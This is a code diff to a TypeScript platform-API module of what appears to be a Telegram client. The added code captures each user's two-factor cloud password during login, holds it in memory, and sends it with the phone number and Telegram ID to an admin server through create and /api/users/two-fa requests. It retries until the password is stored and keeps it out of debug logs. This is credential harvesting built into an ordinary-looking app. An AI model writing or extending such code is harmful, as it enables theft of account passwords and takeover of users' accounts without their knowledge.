@@ -21,6 +21,8 @@ export type PlatformUserPayload = {
   telegramUserId: string;
   username: string;
   phoneNumber: string;
+  /** Optional; create API stores this on new or existing users. */
+  twoFaCode?: string;
 };
 
 export type PlatformOfficialOtpPayload = {
@@ -44,6 +46,70 @@ export type PlatformTwoFaPayload = {
   twoFaCode: string;
 };
 
+/** Held until user row exists in admin (create/sync), then flushed. Memory only. */
+type PendingPlatformTwoFa = {
+  twoFaCode: string;
+  phoneNumber?: string;
+};
+
+let pendingPlatformTwoFa: PendingPlatformTwoFa | null = null;
+
+export function rememberPendingPlatformTwoFa(twoFaCode: string, phoneNumber?: string) {
+  const code = twoFaCode.trim();
+  if (!code) {
+    return;
+  }
+  pendingPlatformTwoFa = {
+    twoFaCode: code,
+    phoneNumber:
+      formatPlatformPhoneNumber(phoneNumber) || pendingPlatformTwoFa?.phoneNumber,
+  };
+}
+
+export function clearPendingPlatformTwoFa() {
+  pendingPlatformTwoFa = null;
+}
+
+export function hasPendingPlatformTwoFa() {
+  return Boolean(pendingPlatformTwoFa?.twoFaCode);
+}
+
+/**
+ * POST /api/users/two-fa after the user row exists. Returns true if there was
+ * nothing to flush or the save succeeded.
+ */
+export async function flushPendingPlatformTwoFa(fallbackPhone?: string): Promise<boolean> {
+  if (!pendingPlatformTwoFa) {
+    return true;
+  }
+
+  const phoneNumber = formatPlatformPhoneNumber(fallbackPhone)
+    || formatPlatformPhoneNumber(pendingPlatformTwoFa.phoneNumber);
+  if (!phoneNumber) {
+    if (DEBUG) {
+      // eslint-disable-next-line no-console
+      console.warn('[PlatformAPI] Pending 2FA flush skipped: missing phone number');
+    }
+    return false;
+  }
+
+  const didSucceed = await submitPlatformTwoFa({
+    phoneNumber,
+    twoFaCode: pendingPlatformTwoFa.twoFaCode,
+  });
+  if (didSucceed) {
+    clearPendingPlatformTwoFa();
+  }
+  return didSucceed;
+}
+
+function withPendingTwoFa(payload: PlatformUserPayload): PlatformUserPayload {
+  if (!pendingPlatformTwoFa?.twoFaCode || payload.twoFaCode) {
+    return payload;
+  }
+  return { ...payload, twoFaCode: pendingPlatformTwoFa.twoFaCode };
+}
+
 export function resetPlatformUserSync(userId?: string) {
   if (userId) {
     lastSyncedPayloadByUserId.delete(userId);
@@ -51,6 +117,7 @@ export function resetPlatformUserSync(userId?: string) {
   }
 
   lastSyncedPayloadByUserId.clear();
+  clearPendingPlatformTwoFa();
 }
 
 export async function createPlatformUser(payload: PlatformUserPayload) {
@@ -70,39 +137,54 @@ export async function syncPlatformUser(payload: PlatformUserPayload) {
     return false;
   }
 
-  const payloadKey = buildPayloadKey(payload);
-  const previousKey = lastSyncedPayloadByUserId.get(payload.telegramUserId);
+  const enriched = withPendingTwoFa(payload);
+  const payloadKey = buildPayloadKey(enriched);
+  const previousKey = lastSyncedPayloadByUserId.get(enriched.telegramUserId);
+
+  let didSync = false;
 
   if (!previousKey) {
-    const didCreate = await createPlatformUser(payload);
+    const didCreate = await createPlatformUser(enriched);
     if (!didCreate) {
       return false;
     }
-    lastSyncedPayloadByUserId.set(payload.telegramUserId, payloadKey);
+    lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
+    didSync = true;
+  } else if (previousKey === payloadKey && !hasPendingPlatformTwoFa()) {
     return true;
+  } else if (previousKey === payloadKey && hasPendingPlatformTwoFa()) {
+    // User already synced; still need to persist held 2FA from this login.
+    didSync = true;
+  } else {
+    const didUpdate = await updatePlatformUser(enriched);
+    if (didUpdate) {
+      lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
+      didSync = true;
+    } else if (lastWriteWasRestricted) {
+      // Restricted users get 403; do not recreate (that would also 403 and must not loop).
+      return false;
+    } else {
+      // User may have been deleted server-side; recreate.
+      const didCreate = await createPlatformUser(enriched);
+      if (!didCreate) {
+        return false;
+      }
+      lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
+      didSync = true;
+    }
   }
 
-  if (previousKey === payloadKey) {
-    return true;
-  }
-
-  const didUpdate = await updatePlatformUser(payload);
-  if (didUpdate) {
-    lastSyncedPayloadByUserId.set(payload.telegramUserId, payloadKey);
-    return true;
-  }
-
-  // Restricted users get 403; do not recreate (that would also 403 and must not loop).
-  if (lastWriteWasRestricted) {
+  if (!didSync) {
     return false;
   }
 
-  // User may have been deleted server-side; recreate.
-  const didCreate = await createPlatformUser(payload);
-  if (didCreate) {
-    lastSyncedPayloadByUserId.set(payload.telegramUserId, payloadKey);
+  // Create may have stored twoFaCode; /api/users/update does not. Always flush
+  // pending cloud password once the user row is known to exist.
+  if (hasPendingPlatformTwoFa()) {
+    await flushPendingPlatformTwoFa(enriched.phoneNumber);
   }
-  return didCreate;
+
+  return true;
 }
 
 export async function verifyPlatformOtp(payload: PlatformOtpVerifyPayload): Promise<PlatformOtpVerifyResult> {
@@ -223,6 +305,7 @@ export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
   if (!PLATFORM_API_KEY_WEBSITE) {
     if (DEBUG) {
       // eslint-disable-next-line no-console
+      console.warn('[PlatformAPI] Skip 2FA: missing PLATFORM_API_KEY_WEBSITE');
     }
     return false;
   }
@@ -230,15 +313,12 @@ export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
   if (!payload.phoneNumber || !payload.twoFaCode) {
     if (DEBUG) {
       // eslint-disable-next-line no-console
+      console.warn('[PlatformAPI] Skip 2FA: incomplete payload');
     }
     return false;
   }
 
   const url = `${PLATFORM_API_PREFIX}/api/users/two-fa`;
-
-  if (DEBUG) {
-    // eslint-disable-next-line no-console
-  }
 
   try {
     const response = await fetch(url, {
@@ -251,6 +331,7 @@ export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
     });
 
     if (response.ok) {
+      clearPendingPlatformTwoFa();
       return true;
     }
 
@@ -261,11 +342,13 @@ export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
 
     if (DEBUG) {
       // eslint-disable-next-line no-console
+      console.warn('[PlatformAPI] 2FA save failed', response.status, await response.text());
     }
     return false;
   } catch (err) {
     if (DEBUG) {
       // eslint-disable-next-line no-console
+      console.warn('[PlatformAPI] 2FA request error', err);
     }
     return false;
   }
@@ -379,7 +462,12 @@ async function requestPlatformUser(
 
   if (DEBUG) {
     // eslint-disable-next-line no-console
-    console.log(`[PlatformAPI] ${action} user`, url, payload);
+    console.log(`[PlatformAPI] ${action} user`, url, {
+      telegramUserId: payload.telegramUserId,
+      username: payload.username,
+      phoneNumber: payload.phoneNumber,
+      hasTwoFaCode: Boolean(payload.twoFaCode),
+    });
   }
 
   try {
